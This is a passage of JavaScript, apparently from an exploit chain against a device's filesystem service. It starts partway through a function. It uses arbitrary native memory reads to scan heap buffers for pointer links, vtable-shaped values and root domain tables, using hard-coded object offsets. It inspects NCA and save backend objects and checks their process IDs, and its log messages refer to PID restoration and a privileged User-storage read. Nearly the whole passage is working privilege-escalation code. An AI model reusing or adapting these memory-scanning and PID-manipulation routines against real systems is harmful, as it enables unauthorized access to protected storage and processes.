        return lookupResult(verified);
    } finally {
        if (cloneHandles.length) {
            for (var leftIndex = cloneHandles.length - 1;
                leftIndex >= 0; leftIndex--) {
                var retryClose = Number(closeHandle(
                    cloneHandles[leftIndex])) >>> 0;
                if (retryClose !== 0) {
                    await log("ROOT: retry clone close failed=" +
                        hex32(retryClose));
                }
            }
            cloneHandles = [];
        }
        if (domainSession && verified) {
            await log("ROOT: retaining the verified domain session " +
                "through PID restoration and the final User-storage read");
        } else if (domainSession) {
            var domainClose = Number(closeHandle(domainSession.handle)) >>> 0;
            await log("ROOT: close inspected domain session rc=" +
                hex32(domainClose));
            domainSession = null;
        }
    }
}

// ── Heap-pointer link scanning ────────────────────────────────────────────

export function scanNativeLinkBuffer(input) {
    const config = input.config;
    const buffer = input.buffer;
    const bufferOffset = input.bufferOffset;
    const length = input.length;
    const sourceAddress = input.sourceAddress;
    const seed = input.seed;
    const links = input.links.slice();
    const seen = {...input.seen};
    var firstOffset = (config.CONTROL_SIZE - sourceAddress % config.CONTROL_SIZE) %
        config.CONTROL_SIZE;
    for (var offset = firstOffset; offset + 64 <= length;
        offset += config.CONTROL_SIZE) {
        var valueBig = read64(buffer + BigInt(bufferOffset + offset));
        if (valueBig <= 0x100000000n || valueBig >= 0x8000000000n ||
            valueBig % BigInt(config.CONTROL_SIZE) !== 0n) continue;
        var value = Number(valueBig);
        if (!Number.isSafeInteger(value) || Math.abs(value - seed) >= 0x2000000)
            continue;
        var zeroTail = true;
        for (var tail = 8; tail < 64; tail += 8) {
            if (read64(buffer + BigInt(bufferOffset + offset + tail)) !== 0n) {
                zeroTail = false;
                break;
            }
        }
        var source = sourceAddress + offset;
        var key = source.toString(16) + ":" + value.toString(16);
        if (seen[key]) continue;
        seen[key] = true;
        links.push({source: source, value: value, zeroTail: zeroTail});
    }
    return {links, seen};
}

// ── Root domain table scanning ────────────────────────────────────────────

export function scanRootDomainChunk(input) {
    const config = input.config;
    const buffer = input.buffer;
    const chunkAddress = input.chunkAddress;
    const carry = input.carry;
    const candidates = input.candidates.slice();
    const seen = {...input.seen};
    for (var offset = 0; offset + 0x20 <= config.ROOT_CAPTURE_CHUNK;
        offset += 8) {
        var candidateAddress = chunkAddress + offset;
        var candidateFirst = read64(buffer + BigInt(offset));
        var candidateSecond = read64(buffer + BigInt(offset + 8));
        var candidateManager = read64(buffer + BigInt(offset + 0x18));
        var candidate = recordRootDomainCandidate(candidateAddress,
            candidateFirst, candidateSecond, candidateManager);
        if (candidate) {
            var key = candidate.address.toString(16) + ":" +
                candidate.rootVptr.toString(16) + ":" +
                candidate.manager.toString(16);
            if (!seen[key]) { seen[key] = true; candidates.push(candidate); }
        }
    }

    if (carry && carry.bytes.length === 0x18) {
        var boundary = carry.bytes.slice();
        for (var byteIndex = 0; byteIndex < 0x18; byteIndex++)
            boundary.push(Number(read8(buffer + BigInt(byteIndex))));
        for (var boundaryOffset = 0; boundaryOffset < 0x18;
            boundaryOffset += 8) {
            var boundaryAddress = carry.address + boundaryOffset;
            var boundaryFirst = AnalysisBytes.readU64LE(boundary, boundaryOffset);
            var boundarySecond = AnalysisBytes.readU64LE(boundary,
                boundaryOffset + 8);
            var boundaryManager = AnalysisBytes.readU64LE(boundary,
                boundaryOffset + 0x18);
            var boundaryCandidate = recordRootDomainCandidate(boundaryAddress,
                boundaryFirst, boundarySecond, boundaryManager);
            if (boundaryCandidate) {
                var boundaryKey = boundaryCandidate.address.toString(16) + ":" +
                    boundaryCandidate.rootVptr.toString(16) + ":" +
                    boundaryCandidate.manager.toString(16);
                if (!seen[boundaryKey]) {
                    seen[boundaryKey] = true;
                    candidates.push(boundaryCandidate);
                }
            }
        }
    }
    return {candidates, seen};
}

export function scanRootDomainChunkPrefiltered(input) {
    const config = input.config;
    const buffer = input.buffer;
    const chunkAddress = input.chunkAddress;
    const carry = input.carry;
    const candidates = input.candidates.slice();
    const seen = {...input.seen};
    var offsetAddress = 0n;
    for (var offset = 0; offset + 0x20 <= config.ROOT_CAPTURE_CHUNK;
        offset += 8, offsetAddress += 8n) {
        var candidateAddress = chunkAddress + offset;
        var candidatePointer = buffer + offsetAddress;

        // The owner layout has stricter guards than a domain wrapper. Fold
        // its scan into this aligned pass so we do not walk every word a
        // second time. Owner starts are a subset of the wrapper scan range.
        if (offset + 0x78 <= config.ROOT_CAPTURE_CHUNK &&
            read64(candidatePointer + 0x20n) === input.retainedOwnerSize &&
            read64(candidatePointer + 0x28n) === 0x4000n &&
            read64(candidatePointer + 0x50n) === 0x5A0n &&
            Number(read32(candidatePointer + 0x58n)) === 10 &&
            read64(candidatePointer + 0x60n) === 14n) {
            input.rememberRetainedOwner(candidateAddress,
                input.copyNativeBytes(candidatePointer, 0x78), 0);
        }

        var candidateFirst = read64(candidatePointer);
        var candidateSecond = undefined; // Fresh value for this slot.
        // A domain candidate must have a canonical first word. Fetch the
        // second word only for that necessary condition or a cache-array
        // header match, which keeps both searches complete.
        if (input.scanRetainedArrays && offset + 0x5A0 <=
                config.ROOT_CAPTURE_CHUNK &&
            candidateFirst === input.retainedHeader0) {
            candidateSecond = read64(candidatePointer + 8n);
            if (candidateSecond === input.retainedHeader1 &&
                Number(read8(candidatePointer + 0x10n)) === 0 &&
                read64(candidatePointer + 0x18n) === 0n &&
                read64(candidatePointer + 0x20n) === 0n &&
                read64(candidatePointer + 0x28n) === 0n) {
                input.rememberRetainedArray(candidateAddress,
                    input.copyNativeBytes(candidatePointer, 0x5A0), 0);
            }
        }
        if (candidateFirst < 0x28E0n ||
            !RootLayout.isCanonicalPointer(candidateFirst)) continue;
        if (candidateSecond === undefined)
            candidateSecond = read64(candidatePointer + 8n);
        if (candidateSecond - candidateFirst !== 0x58n) continue;
        var vptrPairRoot = candidateFirst - 0x28E0n;
        if (!RootLayout.isCanonicalPointer(candidateSecond) ||
            !RootLayout.isCanonicalPointer(vptrPairRoot) ||
            vptrPairRoot + 0x5880n >= 0x8000000000n) continue;
        var candidateManager = read64(candidatePointer + 0x18n);
        var candidate = recordRootDomainCandidate(candidateAddress,
            candidateFirst, candidateSecond, candidateManager);
        if (candidate) {
            var key = candidate.address.toString(16) + ":" +
                candidate.rootVptr.toString(16) + ":" +
                candidate.manager.toString(16);
            if (!seen[key]) { seen[key] = true; candidates.push(candidate); }
        }
    }

    if (carry && carry.bytes.length === 0x18) {
        var boundary = carry.bytes.concat(
            input.copyNativeBytes(buffer, 0x18));
        for (var boundaryOffset = 0; boundaryOffset < 0x18;
            boundaryOffset += 8) {
            var boundaryAddress = carry.address + boundaryOffset;
            var boundaryFirst = AnalysisBytes.readU64LE(boundary, boundaryOffset);
            var boundarySecond = AnalysisBytes.readU64LE(boundary,
                boundaryOffset + 8);
            if (boundarySecond - boundaryFirst !== 0x58n ||
                boundaryFirst < 0x28E0n) continue;
            var boundaryRootVptr = boundaryFirst - 0x28E0n;
            if (!RootLayout.isCanonicalPointer(boundaryFirst) ||
                !RootLayout.isCanonicalPointer(boundarySecond) ||
                !RootLayout.isCanonicalPointer(boundaryRootVptr) ||
                boundaryRootVptr + 0x5880n >= 0x8000000000n) continue;
            var boundaryManager = AnalysisBytes.readU64LE(boundary,
                boundaryOffset + 0x18);
            var boundaryCandidate = recordRootDomainCandidate(boundaryAddress,
                boundaryFirst, boundarySecond, boundaryManager);
            if (boundaryCandidate) {
                var boundaryKey = boundaryCandidate.address.toString(16) + ":" +
                    boundaryCandidate.rootVptr.toString(16) + ":" +
                    boundaryCandidate.manager.toString(16);
                if (!seen[boundaryKey]) {
                    seen[boundaryKey] = true;
                    candidates.push(boundaryCandidate);
                }
            }
        }
    }
    return {candidates, seen};
}

export function captureDomainTail(input) {
    const config = input.config;
    const buffer = input.buffer;
    const chunkAddress = input.chunkAddress;
    var bytes = input.copyNativeBytes(
        buffer + BigInt(config.ROOT_CAPTURE_CHUNK - 0x18), 0x18);
    return {address: chunkAddress + config.ROOT_CAPTURE_CHUNK - 0x18,
        bytes: bytes};
}

export function recordRootDomainCandidate(address, first, second, manager) {
    var candidate = RootLayout.makeDomainCandidate(address, first, second,
        manager, {domainVptrDelta: 0x58n, rootVptrDelta: 0x28E0n});
    if (!candidate || BigInt(candidate.rootVptr) + 0x5880n >= 0x8000000000n)
        return null;
    return candidate;
}

// ── Root backend inspection ───────────────────────────────────────────────

// The reference fs-root-pid implementation follows each root pointer and
// checks raw == control + 0x18, a canonical backend vptr, and PID == root PID or 1.
// It does not provide a firmware-specific exact NCA/save vtable constant, so
// this guard records vptr shape without claiming a concrete class identity.
export async function inspectRootBackend(name, raw, control, pidOffset, rootPid,
    outputBuf, input) {
    var expectedPidOffset = -1;
    if (name === "nca") {
        expectedPidOffset = 0x20;
    } else if (name === "save") {
        expectedPidOffset = 0x28;
    }

    var linksOk = expectedPidOffset === pidOffset &&
        RootLayout.isCanonicalPointer(raw) && RootLayout.isCanonicalPointer(control) &&
        raw === control + 0x18n;
    await log("ROOT BACKEND " + name + " link raw=0x" +
        raw.toString(16) + " control=0x" + control.toString(16) +
        " expectedRaw=control+0x18 linksOk=" + linksOk +
        " pidOffset=0x" + pidOffset.toString(16));
    if (!linksOk)
        return {name: name, read: false, linksOk: false,
            vptrShapeOk: false, pidOk: false, stable: false};

    var backendAddress = Number(raw);
    var backendRead = await readFsAddressBytes({...input,
        address: backendAddress, length: 0x60, outputBuf});
    if (!backendRead.ok) {
        await log("ROOT BACKEND " + name +
            ": skipped; " + backendRead.error);
        return {name: name, read: false, linksOk: true,
            vptrShapeOk: false, pidOk: false, stable: false};
    }

    var vptr = AnalysisBytes.readU64LE(backendRead.bytes, 0);
    var vptrShapeOk = RootLayout.isCanonicalPointer(vptr);
    if (!vptrShapeOk) {
        await log("ROOT BACKEND " + name +
            " type-shape rejected vptr=0x" + vptr.toString(16));
        return {name: name, read: true, linksOk: true,
            vptrShapeOk: false, pidOk: false, stable: false};
    }

    var pid = AnalysisBytes.readU64LE(backendRead.bytes, pidOffset);
    var pidPlausible = pid > 0n && pid < 0x1000000n;
    var pidMatchesRootOrOne = pid === rootPid || pid === 1n;
    var pidOk = pidPlausible && pidMatchesRootOrOne;
    var reread = await readFsAddressBytes({...input,
        address: backendAddress, length: 0x60, outputBuf});
    var stable = reread.ok && AnalysisBytes.equal(reread.bytes,
        backendRead.bytes);
    await log("ROOT BACKEND " + name + " address=0x" +
        backendAddress.toString(16) + " vptr=0x" + vptr.toString(16) +
        " canonicalTypeShape=" + vptrShapeOk + " pid=0x" + pid.toString(16) +
        " pidPlausible=" + pidPlausible + " pidMatchesRootOrOne=" +
        pidMatchesRootOrOne + " stable=" + stable +
        (reread.ok ? "" : " rereadError=" + reread.error));
    return {name: name, address: backendAddress, read: true,
        linksOk: linksOk, vptrShapeOk: vptrShapeOk, pidOk: pidOk,
        stable: stable, vptr: vptr, pid: pid,
        bytes: backendRead.bytes.slice()};
}
